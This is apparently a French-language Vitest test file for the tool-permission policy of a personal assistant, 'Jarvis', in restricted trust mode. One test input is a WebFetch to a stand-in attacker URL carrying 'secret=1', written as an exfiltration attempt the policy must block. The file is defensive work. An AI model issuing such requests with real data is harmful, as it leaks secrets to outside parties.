import { describe, expect, it } from "vitest";
import { decide } from "../src/shared/policy.js";

/**
 * Régression : le briefing du matin répondait « l'accès à la recherche web est bloqué ». Dans Jarvis, WebSearch est un
 * outil chargé à la demande : Claude appelle d'abord ToolSearch. En mode « restreint », ToolSearch était refusé.
 */
describe("contenu externe restreint : la recherche web doit pouvoir se charger", () => {
  const briefing = { trust: "restreint" as const, outilsAutorises: ["WebSearch", "WebFetch"] };

  it("ToolSearch passe (il ne charge qu'une définition), puis WebSearch et WebFetch", () => {
    expect(decide("ToolSearch", { query: "select:WebSearch" }, briefing).allow).toBe(true);
    expect(decide("WebSearch", { query: "actualité F1" }, briefing).allow).toBe(true);
    expect(decide("WebFetch", { url: "https://exemple.fr" }, briefing).allow).toBe(true);
  });

  it("charger un outil ne donne PAS le droit de s'en servir : tout le reste reste refusé", () => {
    expect(decide("ToolSearch", { query: "select:Bash,pc_powershell" }, briefing).allow).toBe(true); // chargé...
    for (const interdit of ["Bash", "PowerShell", "Write", "mcp__jarvis__pc_powershell", "mcp__jarvis__pc_clavier", "mcp__home-assistant__allumer", "mcp__jarvis__fichier_corbeille"]) {
      expect(decide(interdit, {}, briefing).allow, interdit).toBe(false); // ...mais jamais utilisable
    }
  });

  it("même sans aucun outil autorisé (analyse de mails, de flux), ToolSearch ne donne aucun pouvoir", () => {
    const aucun = { trust: "restreint" as const, outilsAutorises: [] };
    expect(decide("ToolSearch", {}, aucun).allow).toBe(true);
    expect(decide("WebSearch", {}, aucun).allow).toBe(false);
    expect(decide("WebFetch", { url: "https://pirate.example/?secret=1" }, aucun).allow).toBe(false);
  });

  it("la surveillance d'écran peut charger puis utiliser ecran_capture, et rien d'autre", () => {
    const ecran = { trust: "restreint" as const, outilsAutorises: ["ecran_capture"] };
    expect(decide("ToolSearch", { query: "select:mcp__jarvis__ecran_capture" }, ecran).allow).toBe(true);
    expect(decide("mcp__jarvis__ecran_capture", {}, ecran).allow).toBe(true);
    expect(decide("mcp__jarvis__pc_clavier", {}, ecran).allow).toBe(false);
  });
});
